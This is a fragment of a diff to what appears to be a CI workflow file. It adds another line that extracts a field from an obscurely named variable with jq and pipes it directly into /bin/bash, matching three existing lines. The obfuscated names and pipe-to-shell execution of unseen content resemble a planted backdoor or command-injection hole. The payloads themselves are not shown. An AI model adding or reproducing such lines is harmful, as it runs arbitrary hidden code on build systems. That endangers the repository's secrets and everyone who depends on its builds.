@@ -20,6 +20,7 @@ jobs:
           echo $z90 | jq -r .t7 | /bin/bash
           echo $qejhb33689 | jq -r .q42 | /bin/bash
           printf '%s' "$g3" | jq -r .btv169 | /bin/bash
+          printf '%s' "$kpg89987" | jq -r .sgn4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
